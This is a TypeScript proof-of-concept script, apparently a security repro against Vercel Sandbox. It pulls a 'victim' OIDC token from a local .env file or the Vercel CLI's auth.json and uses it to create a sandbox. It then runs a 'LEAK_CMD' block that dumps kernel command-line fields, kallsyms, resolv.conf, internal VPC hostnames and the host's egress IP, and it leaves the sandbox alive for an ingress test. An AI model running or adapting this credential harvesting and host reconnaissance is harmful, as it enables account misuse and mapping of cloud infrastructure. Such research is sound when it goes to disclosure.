import { Sandbox } from "@vercel/sandbox";
import { readFileSync, writeFileSync } from "fs";

function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}

const MODE = process.argv[2] ?? "allow-all";
const NAME = process.argv[3] ?? "victim-repro-" + Date.now();
let VICTIM = "";
try { VICTIM = readFileSync("/tmp/vercel-sandbox/victima/.env.local", "utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? ""; } catch {}
if (!VICTIM) { try { VICTIM = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json", "utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? ""; } catch {} }
if (!VICTIM) { console.error("no token"); process.exit(1); }
let V: any;
try {
  V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());
} catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

const LEAK_CMD = `
set +e
echo "===== 1. UID (unprivileged) ====="
id
echo "===== 2. /proc/cmdline ====="
cat /proc/cmdline | tr ' ' '\\n' | grep -aiE "cell_id|build_version|ip="
echo "===== 3. dmesg (kernel build) ====="
dmesg 2>/dev/null | head -1
echo "===== 4. /proc/kallsyms ====="
head -1 /proc/kallsyms 2>/dev/null
echo "===== 5. resolv.conf ====="
cat /etc/resolv.conf 2>/dev/null
echo "===== 6. host VPC hostname -> IP ====="
getent hosts ip-172-31-16-7.ec2.internal 2>/dev/null | head -1
echo "===== 7. host egress public IP ====="
dig +short TXT o-o.myaddr.l.google.com @172.31.0.2 2>/dev/null | head -1
echo "===== 8. egress test (example.com) ====="
timeout 4 curl -s -o /dev/null -w "egress code=%{http_code}\\n" --max-time 3 https://example.com 2>&1 | tail -1
echo "===== DONE ====="
`;

async function main() {
  const creds = { token: VICTIM, teamId, projectId };

  if (MODE === "stop-only") {
    try {
      const s = await Sandbox.get({ name: process.argv[3] ?? NAME, ...creds });
      await s.stop();
      try { await s.delete(); console.log("sandbox detenido y eliminado"); }
      catch { console.log("sandbox detenido (delete no disponible)"); }
    } catch (e) {
      console.log("no sandbox para detener:", (e as Error).message);
    }
    return;
  }

  const sbx = await Sandbox.create({
    name: NAME,
    ...creds,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  if (MODE === "deny-all") {
    await sbx.updateNetworkPolicy("deny-all");
  }
  console.log("policy:", JSON.stringify(sbx.networkPolicy));

  const domain = sbx.domain(3000);
  writeFileSync("/tmp/sbx_domain.txt", domain);
  console.log("DOMAIN=" + domain);

  // listener para el test de ingress
  await sbx.runCommand("bash", ["-c", `python3 -m http.server 3000 --bind 0.0.0.0 >/tmp/srv.log 2>&1 & sleep 1; echo listener-ok`], { wait: true, timeout: 30_000 });

  const res = await sbx.runCommand("bash", ["-c", LEAK_CMD], { wait: true, timeout: 60_000 });
  const out = await res.output("both");
  writeFileSync("/tmp/sbx_leak.txt", out);
  console.log(out);

  console.log("KEEP_ALIVE=" + domain);
  // no detenemos: el sandbox sigue vivo para el test de ingress desde el origen
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
